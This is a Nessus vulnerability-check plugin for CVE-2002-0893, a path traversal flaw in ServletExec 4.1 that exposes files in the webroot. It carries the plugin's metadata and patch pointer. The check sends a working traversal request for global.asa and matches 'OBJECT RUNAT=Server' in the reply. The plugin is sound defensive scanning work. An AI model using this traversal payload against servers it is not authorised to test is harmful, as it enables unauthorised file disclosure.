#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#
# Changes by Tenable
#
# - Updated to use compat.inc, added CVSS score (11/20/2009)



include("compat.inc");

if(description)
{
 script_id(10959);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2002-0893");
 script_bugtraq_id(4795);
 script_osvdb_id(783);

 script_name(english:"ServletExec 4.1 ISAPI com.newatlanta.servletexec.JSP10Servlet Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has a script that is affected by an information
disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"By invoking the JSPServlet directly it is possible to read the contents of 
files within the webroot that would not normally be accessible (global.asa, 
for example.) When attempting to retrieve ASP pages it is common to see many 
errors due to their similarity to JSP pages in syntax, and hence only 
fragments of these pages are returned. Text files can generally be read 
without problem." );
 script_set_attribute(attribute:"solution", value:
"Download Patch #9 from ftp://ftp.newatlanta.com/public/4_1/patches/

References: www.westpoint.ltd.uk/advisories/wp-02-0006.txt" );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/05/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/05/22");
 script_cvs_date("$Date: 2016/05/13 15:33:30 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Tests for ServletExec File Reading");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Matt Moore");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{ 
# Uses global.asa as target to retrieve. Could be improved to use output of webmirror.nasl

 req = http_get(item:"/servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa", port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if ( ! r ) exit(0);
 confirmed = string("OBJECT RUNAT=Server"); 
 if(confirmed >< r)	
 	security_warning(port);
}

